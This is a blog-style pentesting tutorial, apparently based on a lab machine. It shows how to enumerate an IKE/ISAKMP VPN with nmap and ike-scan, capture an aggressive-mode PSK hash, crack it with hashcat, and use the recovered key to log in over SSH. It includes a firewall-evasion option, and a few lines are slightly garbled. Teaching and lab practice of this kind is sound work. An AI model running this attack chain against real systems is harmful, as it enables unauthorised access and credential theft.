---
title: IKE Enumeration for Pentesters
published: 2025-12-14
description: "⭐ NANO IS HERE ⭐"
image: "./IKE_PE.png"
tags: ["IKEEnumeration", "PSKCracking", "Pentesting","IKE-scan","ISAKMP"]
category: Network
draft: false
---
> [Source](./IKE_PE.png)

⭐ **NANO IS HERE** ⭐
--------------------

Step‑by‑step guide for enumerating IKE/ISAKMP during penetration testing
-

1. UDP Port Scanning
---------------------

Always scan UDP ports — many VPN services run over UDP, especially IPsec on **UDP/500**.

```
nmap -sU -sV example_ip -T5
```

**Options:**

*   **-sU** → UDP scan
*   **-sV** → Service/version detection
*   **-T5** → Fast/aggressive timing

**Result Example:**

```
500/udp open  isakmp
```

This confirms an **IKE/ISAKMP** service is running.

2. Basic IKE Scan (Main Mode)
------------------------------

Enumerate crypto settings and understand the VPN’s configuration.

```
ike-scan example_ip
```

**This reveals:**

*   Encryption algorithms (3DES, AES, …)
*   Hashing (SHA1, MD5, …)
*   DH groups (modp1024, …)
*   Authentication type (PSK, RSA, …)
*   Vendor IDs (XAUTH, DPD, …)
  3. Multiline Output (-M)
-------------------------

More readable, structured output.

```
ike-scan -M example_ip
```

4. Aggressive Mode Scan (-A)
-----------------------------

Aggressive Mode leaks more sensitive information, including user identity.

```
ike-scan -A example_ip
```

**Leaked Information:**

*   Key Exchange
*   Nonce
*   Hash
*   **User Identity** → e.g., `ike@example.com`
*   Vendor IDs: XAUTH, DPD
*   Crypto proposal details

The leaked identity can be used later for SSH access.

5. Saving PSK Hash for Offline Cracking
----------------------------------------

Extract hash material from Aggressive Mode for offline cracking.

```
ike-scan -M -A example_ip --pskcrack=output.txt
```

**Options:**

*   **-M** → Multiline readable output
*   **-A** → Aggressive Mode
*   **— pskcrack=output.txt** → Save PSK hash for Hashcat

**Result:**
Hash successfully saved to `output.txt`.

6. Extra Useful IKE Options (Advanced)
---------------------------------------

```
--id=<value>
```

Send a custom identity.

```
-v
```

Verbose debug output.

```
-n <number>
```

Retry count — useful for unstable networks.

```
--sport=<port>
```

Send from a custom source port (firewall evasion).

7. Cracking the PSK (Hashcat)
------------------------------

Before choosing a Hashcat mode:

**Visit:**
[https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
to find the correct hash mode.

**If you’re not sure what hash type it is**, use:

```
hashid output.txt
```

or:

```
hash-identifier
```

For IKE Aggressive Mode PSK, the correct mode is:

**5400 (IKE-PSK SHA1)**

Crack the PSK:

```
hashcat -m 5400 -a 0 output.txt rockyou.txt
```

**Options:**

*   **-m 5400** → IKE-PSK SHA1
*   **-a 0** → Dictionary attack
*   **output.txt** → Extracted PSK hash
*   **LIKE rockyou.txt** → Wordlist

If successful, Hashcat will reveal the pre‑shared key.

8. Credentials Obtained
------------------------

From enumeration + cracking:

*   **Username:** ike
*   **Identity:** [ike@example.](mailto:ike@example.htb)ip
*   **Password:** (cracked PSK)

9. Initial Access (SSH)
------------------------

```
ssh ike@example_ip
```

If the PSK is correct → **SSH login succeeds**.

Summary FlOW Table
------------------

```
| Step | Tool                | Purpose                   |
| ---- | ------------------- | ------------------------- |
| 1    | nmap                | Discover UDP/500 (ISAKMP) |
| 2    | ike-scan            | Enumerate IKE Main Mode   |
| 3    | ike-scan -A         | Get IDs + crypto details  |
| 4    | ike-scan --pskcrack | Save PSK hash             |
| 5    | hashcat             | Crack IKE PSK             |
| 6    | ssh                 | Gain initial access       |
```


